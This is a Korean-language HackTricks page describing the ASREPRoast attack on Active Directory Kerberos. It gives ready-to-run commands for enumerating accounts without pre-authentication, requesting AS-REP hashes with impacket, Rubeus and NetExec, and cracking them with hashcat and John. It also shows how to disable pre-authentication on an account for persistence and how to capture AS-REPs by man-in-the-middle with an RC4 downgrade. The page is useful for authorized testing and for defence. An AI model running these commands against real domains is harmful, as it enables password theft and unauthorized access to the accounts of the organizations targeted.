# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast는 **Kerberos pre-authentication required attribute**가 없는 사용자를 악용하는 보안 공격입니다. 본질적으로 이 취약점은 공격자가 사용자의 비밀번호 없이 Domain Controller (DC)에서 사용자에 대한 인증을 요청할 수 있게 합니다. 그러면 DC는 사용자의 비밀번호에서 파생된 키로 암호화된 메시지로 응답하며, 공격자는 이를 오프라인으로 크랙하여 사용자의 비밀번호를 알아낼 수 있습니다.

이 공격의 주요 요구 사항은 다음과 같습니다:

- **Kerberos pre-authentication 부재**: 대상 사용자에게 이 보안 기능이 활성화되어 있으면 안 됩니다.
- **Domain Controller (DC)와의 연결**: 공격자는 요청을 보내고 암호화된 메시지를 받기 위해 DC에 접근할 수 있어야 합니다.
- **선택적 domain account**: domain account가 있으면 LDAP 쿼리를 통해 취약한 사용자를 더 효율적으로 식별할 수 있습니다. 해당 계정이 없으면 공격자는 사용자 이름을 추측해야 합니다.

#### 취약한 사용자 열거하기 (domain credentials 필요)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP 메시지 요청
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus는 기본적으로 **RC4**를 요청하므로, Event ID **4768**에는 보통 **preauth type 0**와 **ticket encryption type 0x17**가 표시됩니다. **`/aes`**를 추가하면(또는 대상에서 RC4가 비활성화되어 있으면) 대신 **AES etypes**가 표시됩니다.

#### Quick one-liners (Linux)

- Kerberos userenum으로 먼저 잠재적 대상을 열거하세요(예: leak된 build paths에서): `kerbrute userenum users.txt -d domain --dc dc.domain`
- 유효한 creds 없이 NetExec를 사용해 전체 username list를 roast하세요: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- creds가 있다면, NetExec가 LDAP를 조회하고 roast 가능한 모든 계정을 요청하게 하세요: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- 출력이 **`$krb5asrep$23$`**로 시작하면 Hashcat **`-m 18200`**으로 crack하세요. **`$krb5asrep$17$`** 또는 **`$krb5asrep$18$`**로 시작하면 John **`--format=krb5asrep`**를 사용하는 것이 좋습니다.

### Cracking

모든 AS-REP roast가 RC4라고 가정하지 마세요. 최신 tooling은 요청/협상된 enctype에 따라 **RC4** (`$krb5asrep$23$`) 또는 **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`)를 반환할 수 있습니다. **`hashcat -m 18200`**은 **etype 23**용이고, **John**은 **17/18/23**에 대해 `krb5asrep`를 직접 처리합니다.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

**GenericAll** 권한(또는 속성을 쓸 수 있는 권한)이 있는 사용자에 대해 **preauth**가 필요 없도록 강제로 설정:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## 자격 증명 없이 ASREProast

공격자는 man-in-the-middle 위치를 이용해 AS-REP 패킷이 네트워크를 통과할 때 캡처할 수 있으며, Kerberos pre-authentication 비활성화에 의존하지 않는다. 따라서 VLAN의 모든 사용자에게서 동작한다.\
no-preauth principal에서 **TGT** 대신 **service ticket**을 반환하는 관련 no-credential 기법이 필요하다면 [Kerberoast](kerberoast.md)를 보라.

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)를 사용하면 이를 수행할 수 있다. `relay` 모드는 공격적으로 가장 흥미로운데, 클라이언트가 여전히 **etype 23**을 광고할 때 **RC4**를 강제로 사용할 수 있기 때문이다; `listen`은 수동적으로 유지되며 클라이언트/DC가 협상한 내용을 그대로 캡처한다.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
